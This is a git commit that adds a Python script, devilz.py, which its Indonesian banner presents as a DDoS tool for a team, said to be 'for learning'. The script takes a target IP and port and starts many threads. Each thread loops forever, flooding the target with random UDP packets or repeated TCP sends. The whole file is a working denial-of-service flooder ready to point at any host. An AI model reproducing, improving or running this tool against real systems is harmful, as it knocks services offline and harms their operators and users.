590f86b903fcf5145c6f1c67c2e1b84d27b07a70
devzli <83598655+devzli@users.noreply.github.com>
2021-05-08 08:12:11 +0700

    Add files via upload

---
+++ devilz.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+#Code by Rence
+import random
+import socket
+import threading
+
+print("~~~ DDOS TOOLS KHUSUS TEAM Devilz ~~~")
+print("~~~ Code and Scripted by Devilz ~~~")
+print("~~~ SUBREK Devilz SAMP ~~~")
+print("~~~ SCRIPT DDOS BY Devilz SAMP dibuat hanya untuk belajar. ~~~")
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket yang dikirim ke target:"))
+threads = int(input(" Threads yang dikirim:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" MATI TANAM!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" MATI TANAM!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
